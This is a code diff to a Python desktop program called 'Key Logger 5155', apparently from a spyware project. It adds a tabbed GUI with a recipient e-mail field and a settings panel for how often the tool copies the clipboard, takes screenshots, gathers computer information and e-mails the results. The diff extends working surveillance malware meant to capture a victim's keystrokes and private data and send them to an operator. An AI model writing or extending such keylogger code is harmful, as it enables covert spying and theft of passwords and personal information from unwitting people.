@@ -14,6 +14,7 @@ from requests import get
 import threading
 from PIL import ImageGrab, Image, ImageTk
 from tkinter import Label,Frame, Entry, Button, messagebox,StringVar
+from tkinter import ttk
 from customtkinter import CTk
 import logging
 import json
@@ -217,21 +218,110 @@ root.config(bg="black")
 root.protocol("WM_DELETE_WINDOW", on_closing)
 btnStr = StringVar()
 btnStr.set("Start Keylogger")
+
+# Style the tab bar (ttk.Notebook) to have a black background
+style = ttk.Style()
+try:
+    # Use a theme that respects background colors
+    style.theme_use('clam')
+except Exception:
+    pass
+style.configure('TNotebook', background='black', borderwidth=0)
+style.configure('TNotebook.Tab', background='black', foreground='green')
+style.map('TNotebook.Tab',
+          background=[('selected', 'black'), ('active', 'black'), ('!selected', 'black')],
+          foreground=[('selected', 'green'), ('!selected', 'green')])
+# Tabs setup
+notebook = ttk.Notebook(root)
+notebook.pack(fill='both', expand=True)
+
+# Logger tab
+logger_tab = Frame(notebook, bg="black")
+notebook.add(logger_tab, text="Logger")
+
 image = Image.open('cracking.png')
 resize_image = image.resize((300, 300))
 img = ImageTk.PhotoImage(resize_image)
 root.after(201, lambda :root.iconbitmap('cracking.ico'))
-icon = Label(root, image=img, bg="black", width=300,height=400)
+icon = Label(logger_tab, image=img, bg="black", width=300,height=400)
 icon.pack()
 root.title("Key Logger 5155")
-Title = Label(root, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"),pady=20, bg="black", fg="green")
+Title = Label(logger_tab, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"),pady=20, bg="black", fg="green")
 Title.pack()
-InputFrame = Frame(root, bg="black", pady=20)
+InputFrame = Frame(logger_tab, bg="black", pady=20)
 InputFrame.pack()
 receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"),pady=20, bg="black", fg="green")
 receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
 receiver_entry.grid(row=0,column=1)
 receiver_label.grid(row=0,column=0)
-button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
+button = Button(logger_tab, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
 button.pack()
+
+# Settings tab
+settings_tab = Frame(notebook, bg="black")
+notebook.add(settings_tab, text="Settings")
+
+# Variables bound to entries
+copy_interval_var = StringVar(value=str(copy_clipboard_interval))
+send_email_interval_var = StringVar(value=str(send_email_interval))
+screenshot_interval_var = StringVar(value=str(screenshot_interval))
+computer_info_interval_var = StringVar(value=str(computer_info_interval))
+
+def save_settings():
+    global copy_clipboard_interval, send_email_interval, screenshot_interval, computer_info_interval, config
+    try:
+        new_copy = int(copy_interval_var.get())
+        new_send = int(send_email_interval_var.get())
+        new_shot = int(screenshot_interval_var.get())
+        new_info = int(computer_info_interval_var.get())
+        if min(new_copy, new_send, new_shot, new_info) <= 0:
+            raise ValueError("Intervals must be positive integers")
+    except Exception as e:
+        messagebox.showerror("Invalid Input", f"Please enter valid positive integers for intervals.\nError: {e}")
+        return
+    # Apply to runtime
+    copy_clipboard_interval = new_copy
+    send_email_interval = new_send
+    screenshot_interval = new_shot
+    computer_info_interval = new_info
+    # Persist to config.json (keep email & password unchanged)
+    config['copy_clipboard_interval'] = new_copy
+    config['send_email_interval'] = new_send
+    config['screenshot_interval'] = new_shot
+    config['computer_info_interval'] = new_info
+    try:
+        with open(config_path, 'w') as f:
+            json.dump(config, f, indent=2)
+        messagebox.showinfo("Saved", "Settings saved successfully.")
+    except Exception as e:
+        messagebox.showerror("Save Failed", f"Could not save settings.\nError: {e}")
+
+def reset_settings():
+    # Reload from current config dict
+    copy_interval_var.set(str(config.get('copy_clipboard_interval', copy_clipboard_interval)))
+    send_email_interval_var.set(str(config.get('send_email_interval', send_email_interval)))
+    screenshot_interval_var.set(str(config.get('screenshot_interval', screenshot_interval)))
+    computer_info_interval_var.set(str(config.get('computer_info_interval', computer_info_interval)))
+
+settings_frame = Frame(settings_tab, bg="black")
+settings_frame.pack(pady=20)
+
+row = 0
+Label(settings_frame, text="Copy Clipboard Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
+Entry(settings_frame, textvariable=copy_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
+row += 1
+Label(settings_frame, text="Send Email Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
+Entry(settings_frame, textvariable=send_email_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
+row += 1
+Label(settings_frame, text="Screenshot Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
+Entry(settings_frame, textvariable=screenshot_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
+row += 1
+Label(settings_frame, text="Computer Info Interval (s)", font=("Cascadia Code", 13, "bold"), bg="black", fg="green").grid(row=row, column=0, sticky='e', padx=10, pady=8)
+Entry(settings_frame, textvariable=computer_info_interval_var, bg="black", fg="green", width=15, font=("Cascadia Code", 13, "bold")).grid(row=row, column=1, sticky='w')
+
+buttons_frame = Frame(settings_tab, bg="black")
+buttons_frame.pack(pady=10)
+Button(buttons_frame, text="Save Settings", command=save_settings, width=20, bg="green", font=("Cascadia Code", 13, "bold")).grid(row=0, column=0, padx=10)
+Button(buttons_frame, text="Reset", command=reset_settings, width=12, bg="green", font=("Cascadia Code", 13, "bold")).grid(row=0, column=1, padx=10)
+
 root.mainloop()
